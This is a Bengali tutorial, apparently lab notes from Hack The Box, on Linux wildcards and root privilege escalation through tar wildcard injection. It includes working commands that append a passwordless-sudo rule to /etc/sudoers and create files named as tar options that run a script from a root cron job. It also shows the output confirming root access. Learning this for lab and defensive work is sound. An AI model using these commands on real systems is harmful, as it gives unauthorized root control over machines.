## ১. ওয়াইল্ডকার্ড (Wildcard) কী?

ওয়াইল্ডকার্ড হলো এমন কিছু বিশেষ ক্যারেক্টার বা চিহ্ন, যেগুলো অন্য ক্যারেক্টার বা ফাইলের নামের বদলে ব্যবহৃত হয়। লিনাক্স শেল (Shell) কোনো কমান্ড রান করার আগেই এই ওয়াইল্ডকার্ডগুলোকে আসল ফাইলের নাম দিয়ে পরিবর্তন করে নেয়।

নিচের টেবিলে গুরুত্বপূর্ণ কিছু ওয়াইল্ডকার্ডের অর্থ দেওয়া হলো:

| ক্যারেক্টার (Character) | তাৎপর্য (Significance) |
| --- | --- |
| `*` (অ্যাস্টেরিস্ক) | ফাইলের নামের যেকোনো সংখ্যক ক্যারেক্টারের সাথে মিলে যায়। (সহজ কথায়, একটি ফোল্ডারের সব ফাইল বোঝাতে এটি ব্যবহৃত হয়)। |
| `?` (প্রশ্নবোধক চিহ্ন) | যেকোনো একটি মাত্র ক্যারেক্টার বা অক্ষরের সাথে মিলে যায়। |
| `[ ]` (ব্র্যাকেট) | ব্র্যাকেটের ভেতরে থাকা যেকোনো একটি ক্যারেক্টারের সাথে মিলে যায়। |
| `~` (টিল্ডা) | ফাইলের শুরুতে থাকলে এটি ইউজারের হোম ডিরেক্টরি (Home directory) বোঝায়। |
| `-` (হাইফেন) | ব্র্যাকেটের ভেতরে থাকলে এটি ক্যারেক্টারের রেঞ্জ বা সীমা বোঝায় (যেমন: A-Z)। |

## ২. Tar কমান্ডের দুর্বলতা

ওয়াইল্ডকার্ডের দুর্বলতা কাজে লাগিয়ে কীভাবে রুট (Root) অ্যাক্সেস পাওয়া যায়, তার একটি দারুণ উদাহরণ হলো `tar` কমান্ড। `tar` হলো লিনাক্সে আর্কাইভ বা জিপ ফাইল তৈরি করার একটি ডিফল্ট টুল।

আমরা যদি টার্মিনালে `man tar` (tar এর ম্যানুয়াল) চেক করি, তবে দুটি বিশেষ অপশন দেখতে পাব:

```text
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.

```

**এর সহজ অর্থ হলো:**

* `--checkpoint=1`: কমান্ডটিকে বলে প্রতি ১টি ফাইলের পর একটি চেকপয়েন্ট তৈরি করতে।
* `--checkpoint-action=exec=sh root.sh`: কমান্ডটিকে বলে, যখনই চেকপয়েন্ট আসবে, তখনই `root.sh` নামের স্ক্রিপ্টটি রান করে দাও।

## ৩. দুর্বল পরিস্থিতি (Vulnerable Scenario)

ধরুন, সিস্টেমে একটি অটোমেটিক Cron Job (শিডিউল করা টাস্ক) সেট করা আছে, যা ব্যাকআপ নেওয়ার জন্য প্রতি মিনিটে রুট (root) পারমিশন নিয়ে নিচের কমান্ডটি চালায়:

```bash
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *

```

এখানে সবচেয়ে বড় ভুলটি হলো কমান্ডের একদম শেষের **`*` (ওয়াইল্ডকার্ড)**।
লিনাক্স শেল কমান্ডটি রান করার আগে `*` এর জায়গায় ওই ফোল্ডারের সমস্ত ফাইলের নাম পর পর বসিয়ে দেয়।

## ৪. হ্যাকিং অ্যাটাক (Wildcard Exploitation)

যেহেতু শেল `*` এর জায়গায় ফাইলের নামগুলো বসায়, আমরা ইচ্ছা করে এমন কিছু ফাইল বানাবো যাদের নাম দেখতে হুবহু `tar` কমান্ডের অপশনের মতো!

**ধাপ ১: ম্যালিশিয়াস স্ক্রিপ্ট তৈরি করা**
প্রথমে আমরা `root.sh` নামে একটি স্ক্রিপ্ট বানাবো। এর কাজ হবে আমাদের বর্তমান ইউজারকে (`htb-student`) পাসওয়ার্ড ছাড়াই রুট কমান্ড চালানোর পারমিশন দেওয়া।

```bash
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

```

**ধাপ ২: অপশনের নামে ফেক ফাইল বানানো**
এবার আমরা এমন দুটি খালি ফাইল বানাবো যাদের নাম হবে হুবহু `tar` এর অপশনের মতো।

```bash
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1

```

**ফলাফল যাচাই:**
আমরা যদি ফোল্ডারের ফাইলগুলো চেক করি (`ls -la`), দেখব ফোল্ডারে অদ্ভুত নামের কিছু ফাইল তৈরি হয়েছে:

```bash
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh

```

## ৫. নেপথ্যের ম্যাজিক (কীভাবে রুট হলাম?)

যখন এক মিনিট পর রুট (Root) ইউজার Cron Job-টি রান করবে, তখন শেল `*` এর জায়গায় ফাইলের নামগুলো বসিয়ে কমান্ডটিকে ঠিক নিচের মতো বানিয়ে ফেলবে:

```bash
tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh root.sh

```

**এখানেই হ্যাকিংয়ের আসল কাজটা হয়!**
`tar` কমান্ড যখন এই লাইনটি পড়বে, সে ভাববে `--checkpoint=1` এবং `--checkpoint-action=exec=sh root.sh` কোনো ফাইলের নাম নয়, বরং এগুলো তার নিজস্ব কমান্ড-লাইন অপশন!

ফলে সে কোনো সন্দেহ না করেই তার কাজ শুরু করবে এবং রুট (root) পারমিশন নিয়ে আমাদের বানানো `root.sh` স্ক্রিপ্টটি রান করে দিবে।

**চূড়ান্ত ধাপ:**
এক মিনিট পর আমরা যদি আমাদের ইউজারের পাওয়ার চেক করি:

```bash
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL

```

আউটপুটে দেখা যাচ্ছে `(root) NOPASSWD: ALL`। অর্থাৎ, আমরা সফলভাবে রুট অ্যাক্সেস পেয়ে গেছি! এখন শুধু `sudo su` টাইপ করলেই আমরা পুরো সিস্টেমের কন্ট্রোল পেয়ে যাব।
